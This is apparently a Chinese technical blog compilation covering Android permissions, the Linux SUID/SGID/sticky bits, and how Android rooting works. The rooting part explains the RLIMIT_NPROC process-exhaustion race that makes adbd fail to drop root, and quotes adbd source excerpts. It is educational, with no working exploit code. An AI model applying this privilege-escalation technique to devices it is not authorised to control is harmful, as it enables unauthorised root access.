//\u5141\u8bb8\u7a0b\u5e8f\u5f53\u524d\u8fd0\u884c\u7a0b\u5e8f\u5f3a\u884c\u5230\u524d\u53f0 android.permission.SET_PROCESS_LIMIT //\u5141\u8bb8\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u884c\u8fdb\u7a0b\u6570\u91cf android.permission.SET_TIME_ZONE //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u65f6\u95f4\u533a\u57df android.permission.SET_WALLPAPER //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8 android.permission.SET_WALLPAPER_HINTS //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8hits android.permission.SIGNAL_PERSISTENT_PROCESSES //\u5141\u8bb8\u7a0b\u5e8f\u8bf7\u6c42\u53d1\u9001\u4fe1\u53f7\u5230\u6240\u6709\u663e\u793a\u7684\u8fdb\u7a0b\u4e2d android.permission.STATUS_BAR //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u3001\u5173\u95ed\u6216\u7981\u7528\u72b6\u6001\u680f\u53ca\u56fe\u6807Allows an application to open, close, or disable the status bar and its icons. android.permission.SUBSCRIBED_FEEDS_READ //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u8ba2\u9605RSS Feed\u5185\u5bb9\u63d0\u4f9b android.permission.SUBSCRIBED_FEEDS_WRITE //\u7cfb\u7edf\u6682\u65f6\u4fdd\u7559\u6539\u8bbe\u7f6e,android\u5f00\u53d1\u7f51\u8ba4\u4e3a\u672a\u6765\u7248\u672c\u4f1a\u52a0\u5165\u8be5\u529f\u80fd\u3002 android.permission.SYSTEM_ALERT_WINDOW //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u7a97\u53e3\u4f7f\u7528 TYPE_SYSTEM_ALERT\uff0c\u663e\u793a\u5728\u5176\u4ed6\u6240\u6709\u7a0b\u5e8f\u7684\u9876\u5c42(Allows an application to open windows using the type TYPE_SYSTEM_ALERT, shown on top of all other applications. ) android.permission.VIBRATE //\u5141\u8bb8\u8bbf\u95ee\u632f\u52a8\u8bbe\u5907 android.permission.WAKE_LOCK //\u5141\u8bb8\u4f7f\u7528PowerManager\u7684 WakeLocks\u4fdd\u6301\u8fdb\u7a0b\u5728\u4f11\u7720\u65f6\u4ece\u5c4f\u5e55\u6d88\u5931 android.permission.WRITE_APN_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165APN\u8bbe\u7f6e android.permission.WRITE_CALENDAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.WRITE_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.WRITE_GSERVICES //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539Google\u670d\u52a1\u5730\u56fe android.permission.WRITE_OWNER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.WRITE_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6216\u5199\u5165\u7cfb\u7edf\u8bbe\u7f6e android.permission.WRITE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u77ed\u4fe1 android.permission.WRITE_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u540c\u6b65\u8bbe\u7f6e Linux\u7684\u7279\u6b8a\u6587\u4ef6\u6743\u9650 \u53d1\u5e03\u4e8e: \u4e00\u822c\u6587\u4ef6\u6743\u9650\u8bfb\uff08R\uff09\uff0c\u5199(W)\uff0c\u6267\u884c\uff08X\uff09\u6743\u9650\u6bd4\u8f83\u7b80\u5355\u3002\u4e00\u822c\u6750\u6599\u4e0a\u9762\u90fd\u6709\u4ecb\u7ecd\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0b\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u6743\u9650\u2014\u2014SUID\uff0cSGID\uff0cStick bit\u3002\u5982\u679c\u4f60\u68c0\u67e5\u4e00\u4e0b/usr/bin/passwd\u548c/tmp/\u7684\u6587\u4ef6\u6743\u9650\u4f60\u5c31\u4f1a\u53d1\u73b0\u548c\u666e\u901a\u7684\u6587\u4ef6\u6743\u9650\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230SUID\u548cStick bit\u3002 SUID\u548cSGID \u6211\u4eec\u9996\u5148\u6765\u8c08\u4e00\u4e0bpasswd\u7a0b\u5e8f\u7279\u6b8a\u7684\u5730\u65b9\u3002\u5927\u5bb6\u90fd\u77e5\u9053\uff0cLinux\u628a\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f\u5b58\u653e\u5728/etc/shadow\u91cc\u9762\uff0c\u8be5\u6587\u4ef6\u5c5e\u6027\u5982\u4e0b\uff1a \u53ef\u4ee5\u770b\u5230Shadow\u7684\u53ea\u6709\u6240\u6709\u8005\u53ef\u8bfb\u5199\uff0c\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u8be5\u6587\u4ef6\u5bf9\u666e\u901a\u7528\u6237\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\u3002\u4f46\u662f\u666e\u901a\u7528\u6237\u8c03\u7528passwd\u7a0b\u5e8f\u662f\u53ef\u4ee5\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\u7684\uff0c\u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u96be\u9053\u666e\u901a\u7528\u6237\u53ef\u4ee5\u8bfb\u5199shadow\u6587\u4ef6\uff1f\u5f53\u7136\u4e0d\u662f\u5566\u3002password\u53ef\u4ee5\u4fee\u6539shadow\u6587\u4ef6\u7684\u539f\u56e0\u662f\u4ed6\u8bbe\u7f6e\u4e86SUID\u6587\u4ef6\u6743\u9650\u3002 SUID\u6587\u4ef6\u6743\u9650\u4f5c\u7528\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u3002\u4e00\u822c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5728\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u662f\u5f53\u524d\u7528\u6237\uff0c\u6bd4\u5982\u5f53\u524d\u7cfb\u7edf\u7528\u6237\u662fsimon\uff0csimon\u8fd0\u884c\u7a0b\u5e8fa.out\uff0ca.out\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u5e94\u8be5\u662fsimon\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u7ed9\u53ef\u6267\u884c\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5219\u8be5\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u6240\u6709\u8005\uff0c\u5c31\u662f\u8be5\u6587\u4ef6\u6240\u6709\u8005 \u3002\u8fd8\u4ee5\u524d\u9762\u7684a.out\u4e3a\u4f8b\uff0c\u5047\u5982a.out\u8bbe\u7f6e\u4e86SUID\uff0c\u5e76\u4e14\u5176\u6240\u6709\u8005\u662froot\uff0c\u7cfb\u7edf\u5f53\u524d\u7528\u6237\u662fsimon\uff0c\u5f53simon\u8fd0\u884ca.out\u7684\u65f6\u5019\uff0ca.out\u5728\u8fd0\u884c\u671f\u7684\u6240\u6709\u8005\u5c31\u662froot\uff0c\u8fd9\u65f6a.out\u53ef\u4ee5\u5b58\u53d6\u53ea\u6709root\u6743\u9650\u624d\u80fd\u5b58\u53d6\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bfb\u5199shadow\u6587\u4ef6\u3002\u5f53a.out\u6267\u884c\u7ed3\u675f\u7684\u65f6\u5019\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u53c8\u56de\u5230\u4e86simon\u7684\u6743\u9650\u4e86\u3002 passwd\u5c31\u662f\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5e76\u4e14passwd\u7684\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u6240\u6709\u7684\u7528\u6237\u90fd\u53ef\u4ee5\u6267\u884c\u4ed6\uff0c\u5728passwd\u8fd0\u884c\u671f\uff0c\u7a0b\u5e8f\u83b7\u5f97\u4e34\u65f6\u7684root\u6743\u9650\uff0c\u8fd9\u65f6\u5176\u53ef\u4ee5\u5b58\u53d6shadow\u6587\u4ef6\u3002\u5f53passwd\u8fd0\u884c\u5b8c\u6210\uff0c\u5f53\u524d\u7528\u6237\u53c8\u56de\u5230\u666e\u901a\u6743\u9650\u3002 \u540c\u7406\uff0c\u8bbe\u7f6e\u7a0b\u5e8f\u7684SGID\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u671f\u53ef\u4ee5\u4e34\u65f6\u83b7\u5f97\u6240\u6709\u8005\u7ec4\u7684\u6743\u9650\u3002\u5728\u56e2\u961f\u5f00\u53d1\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6743\u9650\u6bd4\u8f83\u6709\u7528\uff0c\u4e00\u822c\u7cfb\u7edf\u7528SUID\u6bd4\u8f83\u591a\u3002 SGID\u53ef\u4ee5\u7528\u4e8e\u76ee\u5f55\uff0c\u5f53\u76ee\u5f55\u8bbe\u7f6e\u4e86SGID\u4e4b\u540e\uff0c\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u5efa\u7acb\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u76f8\u540c\u7684\u7528\u6237\u7ec4\u3002 Stick bit(\u7c98\u8d34\u4f4d) \u5bf9\u7a0b\u5e8f\uff0c\u8be5\u6743\u9650\u544a\u8bc9\u7cfb\u7edf\u5728\u7a0b\u5e8f\u5b8c\u6210\u540e\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u8fd0\u884c\u7a0b\u5e8f\u7684\u5907\u4efd\uff0c\u5982\u8be5\u7a0b\u5e8f\u5e38\u7528\uff0c\u53ef\u4e3a\u7cfb\u7edf\u8282\u7701\u70b9\u65f6\u95f4\uff0c\u4e0d\u7528\u6bcf\u6b21\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u3002Linux\u5f53\u524d\u5bf9\u6587\u4ef6\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e00\u4e9b\u5176\u4ed6\u7684UNIX\u7cfb\u7edf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002 Stick bit\u53ef\u4ee5\u4f5c\u7528\u4e8e\u76ee\u5f55\uff0c\u5728\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u7684\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u53ea\u6709\u6240\u6709\u8005\u548croot\u53ef\u4ee5\u5220\u9664\u4ed6\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u56de\u5934\u53bb\u770b\u770b/tmp/\u76ee\u5f55\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u76ee\u5f55\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u3002\u6240\u4ee5\u8bf4\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5bf9\u8be5\u76ee\u5f55\u8bfb\u5199\u6267\u884c\uff08777\uff09\uff0c\u8fd9\u6837\u610f\u5473\u7740\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5728/tmp/\u4e0b\u9762\u521b\u5efa\u4e34\u65f6\u76ee\u5f55\u3002\u56e0\u4e3a\u8bbe\u7f6eStick bit\u53ea\u6709\u6240\u6709\u8005\u548croot\u624d\u80fd\u5220\u9664\u76ee\u5f55\u3002\u8fd9\u6837\u666e\u901a\u7528\u6237\u53ea\u80fd\u5220\u9664\u5c5e\u4e8e\u81ea\u5df1\u7684\u6587\u4ef6\uff0c\u800c\u4e0d\u80fd\u5220\u9664\u5176\u4ed6\u4eba\u7684\u6587\u4ef6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8bbe\u7f6eSUID\uff0cSGID\uff0cStick bit \u524d\u9762\u4ecb\u7ecd\u8fc7SUID\u4e0eSGID\u7684\u529f\u80fd\uff0c\u90a3\u4e48\uff0c\u5982\u4f55\u6253\u5f00\u6587\u4ef6\u4f7f\u5176\u6210\u4e3a\u5177\u6709SUID\u4e0eSGID\u7684\u6743\u9650\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u4e86\u3002\u73b0\u5728\u5e94\u8be5\u77e5\u9053\uff0c\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u7684\u65b9\u5f0f\u4e3a\u201c3\u4e2a\u6570\u5b57\u201d\u7684\u7ec4\u5408\uff0c\u90a3\u4e48\uff0c\u5982\u679c\u5728\u8fd93\u4e2a\u6570\u5b57\u4e4b\u524d\u518d\u52a0\u4e0a\u4e00\u4e2a\u6570\u5b57\uff0c\u6700\u524d\u9762\u7684\u6570\u5b57\u5c31\u8868\u793a\u8fd9\u51e0\u4e2a\u5c5e\u6027\u4e86\uff08\u6ce8\uff1a\u901a\u5e38\u6211\u4eec\u4f7f\u7528chmod 0777 filename\u7684\u65b9\u5f0f\u6765\u8bbe\u7f6efilename\u7684\u5c5e\u6027\u65f6\uff0c\u5219\u662f\u5047\u8bbe\u6ca1\u6709SUID\u3001SGID\u53caSticky bit\uff09\u3002 4\u4e3aSUID 2\u4e3aSGID 1\u4e3aSticky bit \u5047\u8bbe\u8981\u5c06\u4e00\u4e2a\u6587\u4ef6\u5c5e\u6027\u6539\u4e3a\u201c-rwsr-xr-x\u201d\uff0c\u7531\u4e8es\u5728\u7528\u6237\u6743\u9650\u4e2d\uff0c\u6240\u4ee5\u662fSUID\uff0c\u56e0\u6b64\uff0c\u5728\u539f\u5148\u7684755\u4e4b\u524d\u8fd8\u8981\u52a0\u4e0a4\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u201cchmod 4755 filename\u201d\u6765\u8bbe\u7f6e\u3002 SUID\u4e5f\u53ef\u4ee5\u7528\u201cchmod u+s filename\u201d\u6765\u8bbe\u7f6e\uff0c\u201cchmod u-s filename\u201d\u6765\u53d6\u6d88SUID\u8bbe\u7f6e\uff1b\u540c\u6837\uff0cSGID\u53ef\u4ee5\u7528\u201cchmod g+s filename\u201d\uff0c\u201cchmod g-s filename\u201d\u6765\u53d6\u6d88SGID\u8bbe\u7f6e\u3002 Android \u7cfb\u7edfroot\u7834\u89e3\u539f\u7406\u5206\u6790 \u83b7\u5f97root\u6743\u9650\u7684\u4ee3\u7801\u5982\u4e0b\uff1a Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os =new DataOutputStream(process.getOutputStream()); ...... os.writeBytes(\"exit\\n\"); os.flush(); process.waitFor(); \u4ece\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9996\u5148\u8981\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u5176\u5b9eroot\u7684\u79d8\u5bc6\u90fd\u5728su\u7a0b\u5e8f\u4e2d\uff0cAndroid\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\u53ea\u80fdroot\u548cshell\u53ef\u4ee5\u7528\u8fd0\u884csu\uff0c\u5982\u679c\u628a\u8fd9\u4e2a\u9650\u5236\u62ff\u6389\uff0c\u5c31\u662froot\u7834\u89e3\u4e86\uff01 \u4e0b\u9762\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\u662f\u600e\u6837\u83b7\u5f97root\u6743\u9650\u7684\uff0c\u5982\u679c\u5bf9Linux\u7684su\u547d\u4ee4\u719f\u6089\u7684\u670b\u53cb\u53ef\u80fd\u77e5\u9053su\u7a0b\u5e8f\u90fd\u8bbe\u7f6eSUID\u4f4d\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u5df2\u7ecfroot\u7834\u89e3\u4e0a\u7684su\u6743\u9650\u8bbe\u7f6e\uff0c \u6211\u4eec\u53d1\u73b0su\u7684\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\uff0c\u662f\u5176\u5b9e\u662fbusybox\u7684\u8f6f\u94fe\u63a5\uff0c\u6211\u4eec\u67e5\u770bbusybox\u7684\u5c5e\u6027\u53d1\u73b0\uff0c\u5176\u8bbe\u7f6e\u4e86SUID\u548cSGID\uff0c\u5e76\u4e14\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\u3002\u8fd9\u6837\u8fd0\u884cbusybox\u7684\u666e\u901a\u7528\u6237\uff0cbusybox\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u83b7\u5f97\u7684\u662froot\u7684\u6709\u6548\u7528\u6237\u3002su\u7a0b\u5e8f\u5219\u662f\u628a\u81ea\u5df1\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5e76\u628a\u81ea\u5df1\u6743\u9650\u63d0\u5347\u81f3root\uff08\u6211\u4eec\u524d\u9762\u63d0\u5230su\u5176\u5b9e\u5c31\u662fbusybox\uff0c\u8fd0\u884c\u671f\u5b83\u7684\u6743\u9650\u662froot\uff0c\u5f53\u7136\u4e5f\u6709\u6743\u9650\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\u4e0d\u5149root\u624b\u673a\u4e0asu\u9700\u8981\u8bbe\u7f6eSUID\uff0c\u6240\u6709\u7684Linux\u7cfb\u7edf\u4e0a\u7684su\u7a0b\u5e8f\u90fd\u9700\u8981\u8bbe\u7f6eSUID\u4f4d\u3002 \u6211\u4eec\u53d1\u73b0su\u4e5f\u8bbe\u7f6e\u4e86SUID\u4f4d\uff0c\u8fd9\u6837\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0csu\u7a0b\u5e8f\u4f1a\u9a8c\u8bc1root \u5bc6\u7801\uff0c\u5982\u679c\u6b63\u786esu\u7a0b\u5e8f\u53ef\u4ee5\u628a\u7528\u6237\u6743\u9650\u63d0\u9ad8\u7684root\uff08\u56e0\u4e3a\u5176\u8bbe\u7f6eSUID\u4f4d\uff0c\u8fd0\u884c\u671f\u662froot\u6743\u9650\uff0c\u8fd9\u6837\u5176\u6709\u6743\u9650\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 Android\u7cfb\u7edf\u7684\u7834\u89e3\u7684\u6839\u672c\u539f\u7406\u5c31\u662f\u66ff\u6362\u6389\u7cfb\u7edf\u4e2d\u7684su\u7a0b\u5e8f\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7684\u9ed8\u8ba4su\u7a0b\u5e8f\u9700\u8981\u9a8c\u8bc1\u5b9e\u9645\u7528\u6237\u6743\u9650\uff08\u53ea\u6709root\u548cshell\u7528\u6237\u624d\u6709\u6743\u8fd0\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\uff0c\u5176\u4ed6\u7528\u6237\u8fd0\u884c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\uff09\u3002\u800c\u7834\u89e3\u540e\u7684su\u5c06\u4e0d\u68c0\u67e5\u5b9e\u9645\u7528\u6237\u6743\u9650\uff0c\u8fd9\u6837\u666e\u901a\u7684\u7528\u6237\u4e5f\u5c06\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u7a0b\u5e8f\u5c06\u81ea\u5df1\u7684\u6743\u9650\u63d0\u5347\u3002 root\u7834\u89e3\u6ca1\u6709\u5229\u7528\u4ec0\u4e48Linux\u5185\u6838\u6f0f\u6d1e\uff08Linux\u5185\u6838\u4e0d\u53ef\u80fd\u6709\u8fd9\u4e48\u5927\u7684\u6f0f\u6d1e\u5b58\u5728\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u6210root\u7834\u89e3\u5c31\u662f\u5728\u4f60\u7cfb\u7edf\u4e2d\u690d\u5165\u201c\u6728\u9a6csu\u201d\uff0c\u8bf4\u5b83\u662f\u201c\u6728\u9a6c\u201d\u4e00\u70b9\u513f\u90fd\u4e0d\u4e3a\u8fc7\uff0c\u5047\u5982\u6076\u610f\u7a0b\u5e8f\u5728\u7cfb\u7edf\u4e2d\u8fd0\u884c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\u7684\u8fd9\u6837\u7684\u7ed3\u679c\u5c06\u4f1a\u662f\u707e\u96be\u6027\u7684\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0broot\u8fc7\u624b\u673a\u90fd\u4f1a\u6709\u4e00\u4e2aSuperUser\u5e94\u7528\u7a0b\u5e8f\u6765\u8ba9\u7528\u6237\u7ba1\u7406\u5141\u8bb8\u8c01\u83b7\u5f97root\u6743\u9650.\u4f46\u662f\u8981\u66ff\u6362\u6389\u7cfb\u7edf\u4e2dsu\u7a0b\u5e8f\u672c\u8eab\u5c31\u662f\u9700\u8981root\u6743\u9650\u7684\uff0c\u600e\u6837\u5728root\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\uff0c\u5047\u8bbe\u9700\u8981\u7834\u89e3\u7684Android\u7cfb\u7edf\u5177\u5907\u5982\u4e0b\u6761\u4ef6\uff1a 1\u3001\u53ef\u4ee5\u901a\u8fc7adb\u8fde\u63a5\u5230\u8bbe\u5907\uff0c\u4e00\u822c\u610f\u5473\u7740\u9a71\u52a8\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u3002 2\u3001\u4f46\u662fadb\u83b7\u5f97\u7528\u6237\u6743\u9650\u662fshell\u7528\u6237\uff0c\u800c\u4e0d\u662froot\u3002 \u5148\u4e86\u89e3\u4e00\u4e0badb\u5de5\u5177\uff0c\u8bbe\u5907\u7aef\u6709adbd\u670d\u52a1\u7a0b\u5e8f\u540e\u53f0\u8fd0\u884c\uff0c\u4e3a\u5f00\u53d1\u673a\u7684adb\u7a0b\u5e8f\u63d0\u4f9b\u670d\u52a1\uff0cadbd\u7684\u6743\u9650\uff0c\u51b3\u5b9a\u4e86adb\u7684\u6743\u9650\u3002\u5177\u4f53\u7528\u6237\u53ef\u67e5\u770b/system/core/adb\u4e0b\u7684\u6e90\u7801\uff0c\u67e5\u770bAndroid.mk\u4f60\u5c06\u4f1a\u53d1\u73b0adb\u548cadbd\u5176\u5b9e\u662f\u4e00\u4efd\u4ee3\u7801\uff0c\u7136\u540e\u901a\u8fc7\u5b8f\u6765\u7f16\u8bd1\u3002 \u67e5\u770badb.c\u7684adb_main\u51fd\u6570\u4f60\u5c06\u4f1a\u53d1\u73b0adbd\u4e2d\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1:int adb_main(int is_daemon) 2: { 3: ...... 4: property_get(\"ro.secure\", value,\"\"); 5: if (strcmp(value,\"1\") == 0) { 6: // don't run as root if ro.secure is set... 7: secure = 1; 8: ...... 9: } 10: 11: if (secure) { 12: ...... 13: setgid(AID_SHELL); 14: setuid(AID_SHELL); 15: ...... 16: } 17: } \u4ece\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230adbd\u4f1a\u68c0\u6d4b\u7cfb\u7edf\u7684ro.secure\u5c5e\u6027\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e3a1\u5219\u5c06\u4f1a\u628a\u81ea\u5df1\u7684\u7528\u6237\u6743\u9650\u964d\u7ea7\u6210shell\u7528\u6237\u3002\u4e00\u822c\u8bbe\u5907\u51fa\u5382\u7684\u65f6\u5019\u5728/default.prop\u6587\u4ef6\u4e2d\u90fd\u4f1a\u6709\uff1a 1: ro.secure=1 \u8fd9\u6837\u5c06\u4f1a\u4f7fadbd\u542f\u52a8\u7684\u65f6\u5019\u81ea\u52a8\u964d\u7ea7\u6210shell\u7528\u6237\u3002 \u7136\u540e\u6211\u4eec\u518d\u4ecb\u7ecd\u4e00\u4e0badbd\u5728\u4ec0\u4e48\u65f6\u5019\u542f\u52a8\u7684\u5462\uff1f\u7b54\u6848\u662f\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u7531init\u8fdb\u7a0b\u542f\u52a8\u3002\u6211\u4eec\u67e5\u770binit.rc\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9\uff1a 1: # adbd is controlled by the persist.service.adb.enable system property 2: service adbd /sbin/adbd 3: disabled \u5bf9Android\u5c5e\u6027\u7cfb\u7edf\u5c11\u6709\u4e86\u89e3\u7684\u670b\u53cb\u5c06\u4f1a\u77e5\u9053\uff0c\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\u542f\u52a8\u7684\u65f6\u5019\u90fd\u662froot\u6743\u9650\uff08\u56e0\u4e3ainit\u8fdb\u884c\u662froot\u6743\u9650\uff0c\u5176\u5b50\u7a0b\u5e8f\u4e5f\u662froot\uff09\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5728adbd\u7a0b\u5e8f\u5728\u6267\u884c\uff1a 1:/* then switch user and group to \"shell\" */ 2: setgid(AID_SHELL); 3: setuid(AID_SHELL); \u4ee3\u7801\u4e4b\u524d\u90fd\u662froot\u6743\u9650\uff0c\u53ea\u6709\u6267\u884c\u8fd9\u4e24\u53e5\u4e4b\u540e\u624d\u53d8\u6210shell\u6743\u9650\u7684\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f15\u51faroot\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\u7684\u65b9\u6cd5\u4e86\uff0c\u90a3\u5c31\u662f\u8ba9\u4e0a\u9762setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u964d\u7ea7\u5931\u8d25\uff0c\u90a3\u5c31\u7ee7\u7eed\u5728root\u6743\u9650\u4e0b\u9762\u8fd0\u884c\u4e86\u3002 \u8fd9\u91cc\u9762\u505a\u4e00\u4e2a\u7b80\u5355\u8bf4\u660e\uff1a 1\u3001\u51fa\u5382\u8bbe\u7f6e\u7684ro.secure\u5c5e\u6027\u4e3a1\uff0c\u5219adbd\u4e5f\u5c06\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 2\u3001adb\u5de5\u5177\u521b\u5efa\u7684\u8fdb\u7a0bratc\u4e5f\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 3\u3001ratc\u4e00\u76f4\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08ratc\u521b\u5efa\u7684\u5b50\u7a0b\u5e8f\u4e5f\u5c06\u4f1a\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff09\uff0c\u7d27\u63a5\u7740\u5b50\u7a0b\u5e8f\u9000\u51fa\uff0c\u5f62\u6210\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5360\u7528shell\u7528\u6237\u7684\u8fdb\u7a0b\u8d44\u6e90\uff0c\u76f4\u5230\u5230\u8fbeshell\u7528\u6237\u7684\u8fdb\u7a0b\u6570\u4e3aRLIMIT_NPROC\u7684\u65f6\u5019\uff08\u5305\u62ecadbd\u3001ratc\u53ca\u5176\u5b50\u7a0b\u5e8f\uff09\uff0c\u8fd9\u662fratc\u5c06\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u5931\u8d25\u3002\u8fd9\u65f6\u5019\u6740\u6389adbd\uff0cadbd\u8fdb\u7a0b\u56e0\u4e3a\u662fAndroid\u7cfb\u7edf\u670d\u52a1\uff0c\u5c06\u4f1a\u88abAndroid\u7cfb\u7edf\u81ea\u52a8\u91cd\u542f\uff0c\u8fd9\u65f6\u5019ratc\u4e5f\u5728\u7ade\u4e89\u4ea7\u751f\u5b50\u7a0b\u5e8f\u3002\u5728adbd\u7a0b\u5e8f\u6267\u884c\u4e0a\u9762setgid\u548csetuid\u4e4b\u524d\uff0cratc\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\uff0c\u90a3\u4e48shell\u7528\u6237\u7684\u8fdb\u7a0b\u9650\u989d\u5df2\u7ecf\u8fbe\u5230\uff0c\u5219adbd\u8fdb\u7a0b\u6267\u884csetgid\u548csetuid\u5c06\u4f1a\u5931\u8d25\u3002\u6839\u636e\u4ee3\u7801\u6211\u4eec\u53d1\u73b0\u5931\u8d25\u4e4b\u540eadbd\u5c06\u4f1a\u7ee7\u7eed\u6267\u884c\u3002\u8fd9\u6837adbd\u8fdb\u7a0b\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 